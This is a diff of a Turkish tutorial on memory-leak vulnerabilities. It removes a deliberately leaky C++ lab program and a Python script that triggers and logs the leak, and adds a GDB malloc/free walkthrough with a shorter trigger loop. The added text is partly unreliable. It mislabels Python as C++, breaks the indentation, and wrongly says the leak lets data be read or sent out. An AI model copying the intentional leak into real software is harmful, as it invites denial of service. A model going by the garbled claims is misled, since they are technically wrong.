@@ -35,138 +35,61 @@ Bellek Sızıntısı (Memory Leak), bir programın `new` veya `malloc` gibi komu
 
 ### Örnek Kod İncelemesi
 
-Öncelikle zafiyetli programımızı yazalım. Bu program, dışarıdan gelen her sinyalde bir miktar bellek ayıracak ama asla serbest bırakmayacaktır.
+Öncelikle zafiyetin incelemesi için kodlarımızı incelememiz gerekiyor lakin bu sefer ben kör bir inceleme yapmayı tercih ediyorum. Yani blackbox (kara kutu) bir incelemede neler yaşarız bunu anlatmak istiyorum. Siz kaynak kodlarına buradan ulaşabilirsiniz.
+
+<img width="638" height="348" alt="resim" src="https://github.com/user-attachments/assets/eaea2d5e-07bf-4785-af59-a818cede16de" />
+
+Öncelikle kodumuzu GDB ile artık klasikleşmiş bir şekilde açıyoruz.
+
+<img width="627" height="471" alt="resim" src="https://github.com/user-attachments/assets/e77b2668-3c36-4692-add1-a93348fb9e0d" />
+
+Bu aşamada daha önce açıkladığımız üzere malloc() ve free() değişkenlerini break ederek bu noktada debugger'ı durdurmamız gerekiyor. Bunu sağlamak için "break malloc" ve "break free" komutlarını kullanmamız gerekiyor.
+
+<img width="692" height="572" alt="resim" src="https://github.com/user-attachments/assets/f3180aa0-8930-48ce-b121-25dfa73c7277" />
+
+İlgili değerleri kullandığımızda malloc değerinin ayrıldığını görüyoruz yani birinci çinkoyu yapıyoruz. Overflow zafiyetlerinden farklı olarak burada bir padding size yok yani burada free() olarak serbest bırakılmamış alanı okumak amacımız.
+
+<img width="681" height="627" alt="resim" src="https://github.com/user-attachments/assets/650083e2-3c6d-408e-8501-6384a7bd0995" />
+
+Ve ikinci çinko ile BINGO değerimizi elde ediyoruz zira "continue" komutunu girdiğimizde free() breakpointine takılmadığını görüyoruz. Bu da alanın serbest bırakılmadığını bize gösteriyor. Bu noktada malloc olduğu lakin free komutunun olmadığı tespitini yaptığımız için bir araç yazmamız gerekiyor. Bunu Python dilinde yazabiliriz. 
 
 ```cpp
-#include <iostream>
-#include <cstdlib> // Gerekli değilse de standart olarak eklenir
-#include <unistd.h> // getpid() fonksiyonu için (Linux/macOS)
-
-/**
- * @brief Her çağrıldığında 10 byte'lık bellek sızdırır.
- */
-void vulnerable_func() {
-    // C++'ın 'new[]' operatörü ile heap üzerinde 10 byte'lık yer ayır.
-    char* ptr = new char[10];
-    
-    // Ayrılan belleğe bir işlem yapılıyormuş gibi göstermek için.
-    if (ptr != nullptr) {
-        ptr[0] = 'L';
-    }
-
-    // HATA: 'new[]' ile ayrılan bu belleğin 'delete[] ptr;' ile
-    // serbest bırakılması gerekirdi. Bu satırın olmaması zafiyete neden olur.
-}
-
-/**
- * @brief Ana program döngüsü.
- */
-int main() {
-    // std::cerr kullanarak hata/bilgi akışına yazdırıyoruz.
-    std::cerr << "[KURBAN] C++ Bellek Sızdırma Programı Başladı." << std::endl;
-    std::cerr << "Saldırgan betikten sinyal bekleniyor..." << std::endl;
-    
-    // Python'dan sürekli karakter/sinyal bekle.
-    // Akış sonlanana kadar (EOF) döngü devam eder.
-    while (std::cin.get() != EOF) {
-        vulnerable_func();
-    }
-
-    return 0;
-}
-```
-
-Zafiyetin temel mantığı basittir: `vulnerable_func()` fonksiyonu içindeki `new char[10]` çağrısı, her seferinde yeni bir bellek alanı tahsis eder. Ancak bu alanın adresini tutan `ptr` değişkeni, fonksiyon bittiğinde kapsam dışı kalarak yok olur. Bellek alanı ise serbest bırakılmadığı için "sahipsiz" bir şekilde program tarafından işgal edilmeye devam eder.
-
-Artık kodu derleyebiliriz. Bu zafiyet türü için `-no-pie` gibi özel bayraklara ihtiyaç yoktur.
-
-```bash
-g++ -o leaky_server leaky_server.cpp
-```
-
------
-
-### Zafiyetin Tespiti ve Etkisinin Gözlemlenmesi
-
-Bu zafiyeti sömürmek, programın akışını değiştirmek değil, **kaynaklarını tüketmektir**. Bunu yapmak ve kanıtlamak için, bir yandan sızıntıyı sürekli tetiklerken, diğer yandan sistem araçlarıyla programın artan bellek kullanımını izleyeceğiz.
-
-1.  **Saldırgan Betiği Başlatılır:** `trigger_and_log_leak.py` betiği, `leaky_server` programını başlatır ve PID'sini tespit eder.
-2.  **Sızıntı Tetiklenir:** Betik, `leaky_server`'ın `stdin`'ine sürekli olarak `\n` (Enter) karakteri gönderir. Her `\n` karakteri, `cin.get()` fonksiyonunu tetikler ve `vulnerable_func()`'nin bir kez daha çalışmasına neden olur.
-3.  **Bellek İzlenir:** Bu sırada, ikinci bir terminalde `watch` ve `ps` komutları kullanılarak `leaky_server`'ın **RSS (Resident Set Size - Fiziksel Bellek Kullanımı)** değeri canlı olarak izlenir.
-
-Aşağıdaki resimde, soldaki terminalde sızıntıyı tetikleyen Python betiği, sağdaki terminalde ise `watch` komutu ile `leaky_server`'ın anbean artan bellek kullanımı (RSS) görülmektedir.
-
-\<img width="951" alt="resim" src="[https://github.com/user-attachments/assets/75211910-6394-4632-8e10-38e23293e506](https://www.google.com/search?q=https://github.com/user-attachments/assets/75211910-6394-4632-8e10-38e23293e506)" /\>
-
-*Bellek Kullanımının Canlı İzlenmesi*
-
-### Sömürü ve Raporlama Kodunun Tam Hali
-
-Bu Python betiği, sızıntıyı tetiklerken aynı zamanda bellek artışını saniye saniye bir CSV dosyasına kaydederek saldırının kanıtını oluşturur.
-
-```python
 import subprocess
 import time
 import sys
-import psutil
-import csv
-import datetime
+import os
 
-# Gereksinim: pip install psutil
+VICTIM_PROGRAM = "./vulnerable_server"
+```
 
-VICTIM_PROGRAM = "./leaky_server"
-LOG_FILE = "memory_leak_log.csv"
+Öncelikle kütüphaneleri içeriye aktarıyorum ve hedef programın yolunu gösteriyorum.
 
-def main():
-    print("--- [SALDIRGAN] Bellek Sızıntısını Tetikleyici ve Kaydedici Başlatıldı ---")
-    p = subprocess.Popen([VICTIM_PROGRAM], stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-    victim_pid = p.pid
-    print(f"[*] '{VICTIM_PROGRAM}' başlatıldı. PID: {victim_pid}")
-    
-    try:
-        victim_process = psutil.Process(victim_pid)
-    except psutil.NoSuchProcess:
-        print(f"[!] HATA: PID {victim_pid} ile bir süreç bulunamadı.")
+```cpp
+try:
+        # Kurban programı bir alt süreç olarak başlatıyoruz.
+        p = subprocess.Popen([VICTIM_PROGRAM], stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+    except FileNotFoundError:
+        print(f"[!] HATA: '{VICTIM_PROGRAM}' bulunamadi. C programını derlediniz mi?")
         sys.exit(1)
-        
-    print(f"[*] Bellek kullanımı '{LOG_FILE}' dosyasına kaydedilecek.")
-    
-    with open(LOG_FILE, 'w', newline='') as f:
-        writer = csv.writer(f)
-        writer.writerow(['Zaman (saniye)', 'Bellek Kullanimi (KB)'])
 
-    start_time = time.time()
-    print("[*] Sızıntı tetikleniyor ve kaydediliyor... (Durdurmak için CTRL+C)")
-    
+    leak_count = 0
     try:
         while True:
             p.stdin.write(b'\n')
             p.stdin.flush()
-            
-            elapsed_time = time.time() - start_time
-            memory_kb = victim_process.memory_info().rss / 1024
-            
-            with open(LOG_FILE, 'a', newline='') as f:
-                writer = csv.writer(f)
-                writer.writerow([f"{elapsed_time:.2f}", f"{memory_kb:.2f}"])
-            
-            print(f"\r[*] Gecen Sure: {elapsed_time:.0f}s, Anlık Bellek: {memory_kb:.2f} KB", end="")
-            time.sleep(0.1)
-            
-    except (KeyboardInterrupt, psutil.NoSuchProcess):
-        print("\n\n[*] İzleme durduruldu.")
-        if p.poll() is None: p.terminate()
-    
-    print(f"--- Analiz Tamamlandı. Veriler '{LOG_FILE}' dosyasında. ---")
-
-if __name__ == "__main__":
-    main()
+            leak_count += 1
+            if leak_count % 1000 == 0:
+                print(f"[*] {leak_count * 10 / 1024:.2f} KB bellek sızdırıldı...")
+            time.sleep(0.001) # Sistemi yormamak için çok kısa bir bekleme
+    except (KeyboardInterrupt, BrokenPipeError):
+        print("\n[*] Tetikleme durduruldu. Kurban program sonlandırılıyor.")
+        p.terminate()
 ```
 
-Betiği çalıştırıp durdurduktan sonra oluşan `memory_leak_log.csv` dosyasını bir hesap tablosu programı ile açarak bellek artışını gösteren aşağıdaki gibi bir grafik elde edebilirsiniz. Bu grafik, zafiyetin etkisini raporlamak için en güçlü kanıttır.
+Şimdi programı başlatıp ne kadar sızıntı olduğunu belirliyorum.
 
-\<img width="576" alt="resim" src="[https://github.com/user-attachments/assets/c50c184c-35cd-4f16-8f9f-02758efcdd26](https://www.google.com/search?q=https://github.com/user-attachments/assets/c50c184c-35cd-4f16-8f9f-02758efcdd26)" /\>
+<img width="537" height="613" alt="resim" src="https://github.com/user-attachments/assets/7c3e423f-bcb9-4bf0-8a40-12e34a8ec818" />
 
-*Bellek Artış Grafiği*
+Ve verilerin başarıyla dışarıya sızdırıldığını görüyorum. Bu aşamada artık zafiyeti doğruluyor ve sistemde sızıntının yaşandığını doğruluyorum.
 
-Okuduğunuz için teşekkür ederim\!
+Okuduğunuz için teşekkürler. 
